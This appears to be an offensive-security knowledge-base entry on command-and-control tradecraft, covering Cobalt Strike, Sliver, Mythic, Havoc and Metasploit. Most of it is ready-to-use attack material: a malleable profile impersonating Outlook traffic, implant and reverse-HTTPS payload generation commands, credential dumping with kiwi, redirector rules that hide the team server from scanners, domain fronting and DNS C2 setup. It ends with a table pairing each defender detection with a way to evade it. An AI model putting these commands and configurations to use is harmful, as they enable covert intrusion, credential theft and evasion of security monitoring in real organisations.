---
title: "C2 Tradecraft"
type: technique
tags: [c2, cobalt-strike, sliver, mythic, havoc, redirectors]
phase: exploitation
date_created: 2026-11-20
---


# C2 tradecraft

Distilled from claude-red `offensive-c2-frameworks`. Operator promotes; never auto-promoted.

## Selection cheatsheet

| Framework  | Transports         | Signature stealth          | Pick when                        |
|------------|--------------------|----------------------------|----------------------------------|
| Cobalt Strike | HTTPS/DNS/SMB   | Malleable profiles, BOFs   | Full-scope red team (commercial) |
| Sliver     | mTLS/WG/DNS/HTTP(S)| Multiplayer, armory exts  | Open-source CS alternative       |
| Mythic     | HTTP(S)            | Pluggable agents/profiles  | Custom agent per OS needed       |
| Havoc      | HTTPS              | Ekko sleep, indirect syscalls | EDR-heavy targets             |
| Metasploit | HTTPS/TCP          | Module library             | Initial access, labs, CTF        |

MITRE anchors: T1071 (app-layer protocol), T1573 (encrypted channel), T1090 (proxy).

## Workflow (order matters)

1. Map target egress constraints first: allowed protocols, proxies, monitoring posture.
2. Pick framework + transport to fit those constraints.
3. Build redirectors between implants and team server. NEVER expose the team server directly.
4. Shape traffic profiles to mimic the target org's legitimate traffic.
5. Generate implants with sleep, jitter, and a kill date.
6. Establish primary + fallback channels on different transports and different infrastructure.
7. Test your own C2 traffic against detection signatures (c2lint, RITA-style frequency analysis) before production use.

## Malleable C2 profile anatomy (Cobalt Strike)

The profile defines HTTP headers, URIs, encoding, TLS cert metadata. Shape it to one specific legitimate application; default/public profiles have published signatures.

```text
set sleeptime "60000";
set jitter    "37";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0";

https-certificate {
    set C   "US";  set ST "Washington";  set L "Redmond";
    set O   "Microsoft Corporation";  set CN "outlook.office365.com";
    set validity "365";
}

http-get {
    set uri "/owa/auth/logon.aspx /autodiscover/autodiscover.xml";
    client {
        metadata { base64url; prepend "session="; header "Cookie"; }
    }
    server {
        header "Server" "Microsoft-IIS/10.0";
        output { base64; prepend "<!DOCTYPE html><html><head></head><body>"; append "</body></html>"; print; }
    }
}
```

Beacon types: HTTP(S) for standard egress; DNS Beacon for low-bandwidth restrictive networks; SMB Beacon (named pipe) and TCP Beacon for internal pivoting with no egress. Stageless preferred, avoids the staging handshake.

Sleep/jitter: `sleep 300 45` = 300s sleep, 45% jitter (165-435s actual). High sleep + high jitter defeats beaconing frequency analysis (Rita, Zeek).

Named pipe pivot from an HTTPS Beacon host:

```text
beacon> link 10.10.10.50 \\.\pipe\msagent_89
```

## BOFs (Beacon Object Files)

Compiled C executing inside Beacon's process, no child process spawn, evades process-based detections.

```c
/* example_bof.c - inline whoami, no child process */
#include <windows.h>
#include "beacon.h"

void go(char *args, int alen) {
    DWORD bufSize = 256;
    char username[256];
    WINBASEAPI BOOL WINAPI ADVAPI32$GetUserNameA(LPSTR, LPDWORD);
    if (ADVAPI32$GetUserNameA(username, &bufSize)) {
        BeaconPrintf(CALLBACK_OUTPUT, "Username: %s", username);
    }
}
```

```text
x86_64-w64-mingw32-gcc -c example_bof.c -o example_bof.o
beacon> inline-execute example_bof.o
```

BOF repos: trustedsec/CS-Situational-Awareness-BOF (enum), anthemtotheego/InlineWhispers (syscall BOFs), rvrsh3ll/BOF_Collection.

## Sliver essentials

```bash
sliver > generate --mtls 10.10.14.5 --os windows --arch amd64 --skip-symbols
sliver > generate --wg 10.10.14.5:53 --os windows --arch amd64      # WireGuard
sliver > generate --dns c2.example.com --os windows --arch amd64    # restrictive nets
sliver > mtls --lhost 0.0.0.0 --lport 8888
sliver > wg  --lport 53
sliver > dns --domains c2.example.com

sliver > new-operator --name operator1 --lhost teamserver.internal  # multiplayer
sliver > armory install rubeus; armory install sharp-hound-4        # extensions

sliver (IMPLANT) > portfwd add --bind 127.0.0.1:9050 --remote 172.16.0.10:445
sliver (IMPLANT) > socks5 start
```

mTLS gives mutual auth by default; WireGuard hides C2 inside a legit-looking tunnel.

## Mythic agents

Apollo (Windows C#, inline .NET, token manipulation), Poseidon (macOS/Linux Go, SSH spawn, keylog), Medusa (Python cross-platform). C2 profiles are JSON: callback_host/port, interval + jitter, custom headers, get/post URIs. Translation containers let the wire format be arbitrary.

## Havoc Demon evasion

- Sleep obfuscation: Ekko (timer-queue, encrypts agent in memory during sleep), Zilean, Foliage (APC-based).
- Indirect syscalls: resolve syscall numbers dynamically, bypass user-mode hooks.
- Stack spoofing: fake return addresses hide call origin.
- AMSI/ETW bypass via hardware breakpoints, no in-memory patching to detect.

## Metasploit

```bash
# stageless HTTPS meterpreter (preferred; no staging handshake)
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.14.5 LPORT=443 \
    HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
    StagerVerifySSLCert=true HandlerSSLCert=/opt/certs/c2.pem \
    -f exe -o payload.exe
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.14.5 LPORT=443 -f csharp
```

Handler: `use exploit/multi/handler`, set matching payload/LHOST/LPORT, `HandlerSSLCert`, `ExitOnSession false`, `run -j`. Post: `migrate -N explorer.exe`, `load kiwi; creds_all`, `portfwd`, `autoroute` + `auxiliary/server/socks_proxy`.

## Redirector infrastructure

Apache mod_rewrite redirector: block scanner user-agents (curl/wget/python/nikto) with a 302 to a real site, proxy ONLY the exact profile URIs to the team server, everything else 302 to decoy:

```apache
RewriteCond %{HTTP_USER_AGENT} (curl|wget|python|scanner|nikto|nmap) [NC]
RewriteRule ^.*$ https://www.microsoft.com/ [L,R=302]

RewriteCond %{REQUEST_URI} ^/owa/auth/logon\.aspx$ [OR]
RewriteCond %{REQUEST_URI} ^/autodiscover/autodiscover\.xml$
RewriteRule ^.*$ https://teamserver.internal:443%{REQUEST_URI} [P,L]

RewriteRule ^.*$ https://www.microsoft.com/ [L,R=302]
```

Domain fronting: outer TLS SNI = reputable CDN domain, inner Host header = your CDN tenant that routes to the backend. Network monitors see CDN traffic. Domain borrowing: dangling CNAME/A on a trusted domain pointing at your infra.

## DNS C2

Delegate a subdomain's NS to the team server, listener on 53. Slow but survives firewalls.

```text
dns.c2ops.example.com  NS  ns1.c2ops.example.com
ns1.c2ops.example.com  A   <team-server-ip>
dig A test.dns.c2ops.example.com @8.8.8.8   # query lands = channel works
```

Implant-side DoH keeps local DNS logs clean while keeping DNS transport. Detection pressure: high query volume + high-entropy subdomain labels; rate-limit, short labels, mix with legit resolution.

## Certificates

- Let's Encrypt for public-facing redirectors (real CA, no anomaly alerts).
- Self-signed with metadata MATCHING the impersonated domain for internal layers; SANs included.
- Implant cert pinning defeats MitM by security appliances (CS: `trust_x509_c2`; Sliver mTLS inherent).

## Defender view (what your config must survive)

| Detection | Targets | Countermeasure |
|---|---|---|
| JA3/JA3S fingerprinting | Default CS Java TLS stack | Custom TLS stack, CDN fronting (inherit CDN JA3S) |
| Beacon frequency analysis (Rita/Zeek) | Regular callback intervals | 40%+ jitter, variable sleep, interactive-only |
| Profile signatures in intel feeds | Public malleable profiles | Custom profiles, c2lint validation |
| DNS tunneling heuristics | Volume + entropy of labels | Rate limit, short labels, mix traffic |
| Memory scanning (EDR) | C2 strings, loader stubs | Sleep obfuscation, in-memory encryption, BOFs over fork-and-run |
| Certificate anomalies | Self-signed / metadata mismatch | Let's Encrypt or metadata-matched certs |
| Sysmon EID 17/18 | Named pipe creation (SMB Beacon) | Pipe names mimicking real services |

<!-- promoted-slug: c2-tradecraft -->
